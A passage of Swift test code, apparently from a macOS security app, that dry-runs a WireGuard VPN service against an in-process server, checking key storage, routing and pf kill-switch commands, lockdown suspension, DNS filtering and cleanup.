        var handler: (([UInt8], WGEndpoint) -> Void)?
        let server: WireGuardPeer
        let q: DispatchQueue
        let serverEndpoint: WGEndpoint
        init(server: WireGuardPeer, q: DispatchQueue, serverEndpoint: WGEndpoint) {
            self.server = server; self.q = q; self.serverEndpoint = serverEndpoint
            server.sendUDP = { [weak self] m, _ in q.async { self?.handler?(m, serverEndpoint) } }
        }
        func start(onDatagram: @escaping ([UInt8], WGEndpoint) -> Void) { handler = onDatagram }
        func send(_ bytes: [UInt8], to: WGEndpoint) { let s = server; q.async { s.receiveUDP(bytes, from: WGEndpoint(host: "198.51.100.20", port: 40123)) } }
        func close() { handler = nil }
    }

    static func vpnServiceDryRun() {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory() + "com.rampart.test.vpn-\(getpid())-\(UInt32.random(in: 0...UInt32.max))")
        defer { try? FileManager.default.removeItem(at: dir) }
        let clock = VPNFakeClock()
        let s = WGCrypto.generatePrivateKey(), cl = WGCrypto.generatePrivateKey(), psk = WGCrypto.randomBytes(32)
        guard let kit = try? HomeServerSetup.generate(endpointHost: "203.0.113.5", privateKeys: (s, cl, psk)),
              let clPub = try? WGCrypto.publicKey(cl),
              let server = try? WireGuardPeer(privateKey: s, peer: WGPeerConfig(publicKey: clPub, presharedKey: psk, endpoint: nil,
                                                allowedIPs: [IPPrefix("10.66.66.2/32")!, IPPrefix("fd66:66:66::2/128")!]), now: { clock.t })
        else { check(false, "service: setup"); return }
        var serverGot: [[UInt8]] = []
        let gotLock = NSLock()
        server.deliverPacket = { p in gotLock.lock(); serverGot.append(p); gotLock.unlock() }
        let tun = MemoryPacketIO(name: "utun-test")
        let runner = DryRunVPNRunner()
        runner.responses["-n get default"] = "gateway: 192.168.1.1\ninterface: en0\n"
        let keys = MemoryVPNKeyStore()
        var lockdown = false, filter = false
        var acts: [String] = []
        var hooks = VPNService.Hooks()
        hooks.lockdownNetworkActive = { lockdown }
        hooks.dnsFilterActive = { filter }
        hooks.activity = { t, _ in acts.append(t) }
        let factories = VPNService.Factories(
            makeTunnel: { _ in tun },
            makeSocket: { _, _, _, q in VPNLoopDatagram(server: server, q: q, serverEndpoint: WGEndpoint(host: "203.0.113.5", port: 51820)) },
            resolve: { h, p in WGEndpoint(host: h, port: p) })
        let svc = VPNService(directory: dir, keyStore: keys, runner: runner, live: false, hooks: hooks, factories: factories, now: { clock.t })
        check(svc.currentStatus().phase == .notConfigured, "service: starts not configured")
        check((try? svc.connect(reason: "user")) == nil, "service: connect without a configuration is refused")

        // Import the generated client config (the private key goes to the key store only).
        let text = kit.clientConfig.render()
        check((try? svc.importConfig(text: text, name: "Home")) != nil, "service: import")
        let st0 = svc.currentStatus()
        check(st0.phase == .disconnected && st0.profile?.endpointHost == "203.0.113.5" && keys.get(account: st0.profile?.id ?? "") == cl, "service: profile saved, key in key store")
        let files = (try? FileManager.default.contentsOfDirectory(atPath: dir.path)) ?? []
        let onDisk = files.compactMap { try? String(contentsOf: dir.appendingPathComponent($0), encoding: .utf8) }.joined()
        check(!onDisk.isEmpty && !onDisk.contains(WGKey.base64(cl)) && !onDisk.contains(WGKey.base64(psk)), "service: no private or preshared key on disk")
        let replyJSON = String(decoding: (try? JSONEncoder().encode(VPNReply(status: st0))) ?? Data(), as: UTF8.self)
        check(!replyJSON.contains(WGKey.base64(cl)), "service: status never carries the private key")

        // Auto-connect is refused while the option is off.
        check((try? svc.connect(reason: "auto: test")) == nil, "service: auto-connect respects the option")
        svc.setOptions(autoConnect: true, killSwitch: nil)

        // Connect (dry run: handshake with the in-process server, system changes recorded as commands).
        check((try? svc.connect(reason: "auto: Cafe is public Wi-Fi")) != nil, "service: auto-connect when enabled")
        func waitFor(_ cond: () -> Bool) -> Bool {
            for _ in 0..<200 { if cond() { return true }; usleep(10_000) }
            return cond()
        }
        check(waitFor { svc.currentStatus().phase == .connected }, "service: connected after the handshake (\(svc.currentStatus().phase), \(svc.currentStatus().error ?? ""))")
        let st = svc.currentStatus()
        check(st.lastHandshake != nil && st.handshakeAge(now: clock.t) == 0 && st.connectedSince != nil, "service: handshake age")
        check(st.dryRunCommands.contains("route -q -n add -inet 0.0.0.0/1 -interface utun-test") && st.dryRunCommands.contains { $0.hasPrefix("scutil") }, "service: dry run lists routes and DNS")
        check(!st.canRouteTraffic && st.notes.contains { $0.contains("Test mode") }, "service: honest test-mode note")

        // A packet from the tunnel interface reaches the server; counters move.
        let pkt = ipv4([10, 66, 66, 2], [1, 1, 1, 1], Array("dns?".utf8))
        svc.sync { tun.inject(pkt) }
        check(waitFor { gotLock.lock(); defer { gotLock.unlock() }; return serverGot.contains(pkt) }, "service: packet goes through the tunnel")
        check(svc.currentStatus().stats.txPackets == 1 && svc.currentStatus().stats.txBytes == UInt64(pkt.count), "service: data counters")
        // And a reply comes back out of the interface.
        let back = ipv4([1, 1, 1, 1], [10, 66, 66, 2], Array("answer".utf8))
        svc.sync { server.sendPacket(back) }
        check(waitFor { svc.sync { tun.written.contains(back) } } && svc.currentStatus().stats.rxPackets == 1, "service: reply delivered to the interface")

        // Kill switch on while connected.
        runner.clear()
        svc.setOptions(autoConnect: nil, killSwitch: true)
        check(svc.currentStatus().killSwitchEngaged && svc.currentStatus().dryRunCommands.contains { $0.hasPrefix("pfctl -a com.apple/252.RampartVPN -f -") }, "service: kill switch loads the pf anchor (\(svc.currentStatus().dryRunCommands.suffix(2)))")

        // Emergency Lockdown: the VPN steps aside, then comes back.
        lockdown = true; clock.advance(3); svc.tick()
        check(svc.currentStatus().phase == .suspendedForLockdown && svc.currentStatus().dryRunCommands.contains("route -q -n delete -inet 0.0.0.0/1 -interface utun-test"), "service: Emergency Lockdown suspends the tunnel routes")
        lockdown = false; clock.advance(3); svc.tick()
        check(svc.currentStatus().phase == .connected, "service: resumes after the lockdown is lifted")
        // DNS filter turned on: DNS re-pointed at the filter.
        filter = true; clock.advance(3); svc.tick()
        check(svc.currentStatus().dnsMode?.contains("DNS filter") == true, "service: DNS filter forwards over the tunnel")

        // Disconnect: routes, DNS and pf removed.
        runner.clear()
        svc.disconnect(reason: "test")
        let d = svc.currentStatus()
        check(d.phase == .disconnected && !d.killSwitchEngaged, "service: disconnected")
        let log = runner.log.map(\.description)
        check(log.contains("pfctl -a com.apple/252.RampartVPN -F all") && log.contains { $0.hasPrefix("scutil") } && log.contains("route -q -n delete -inet 128.0.0.0/1 -interface utun-test"), "service: disconnect cleans up everything")
        check(acts.contains("VPN connecting automatically") && acts.contains("VPN disconnected"), "service: activity entries")

        // Lost key -> clear error, no crash.
        if let id = d.profile?.id { keys.delete(account: id) }
        check((try? svc.connect(reason: "user")) == nil && svc.currentStatus().error?.contains("isn't in the") == true, "service: missing key explained")
        // IPC entry point
        let r = try? svc.handle(op: .status, body: nil)
        check(r?.status.profile != nil, "service: IPC status")
        check((try? svc.handle(op: .setupHome, body: VPNRequestBody(host: "myhome.duckdns.org")))?.kit?.macCommands.contains("brew") == true, "service: IPC home server setup")
        check(VPNOp.status.readOnly && VPNOp.disconnect.weakens && !VPNOp.connect.weakens, "service: op levels")
        svc.removeProfile()
        check(svc.currentStatus().phase == .notConfigured, "service: remove")
    }
}
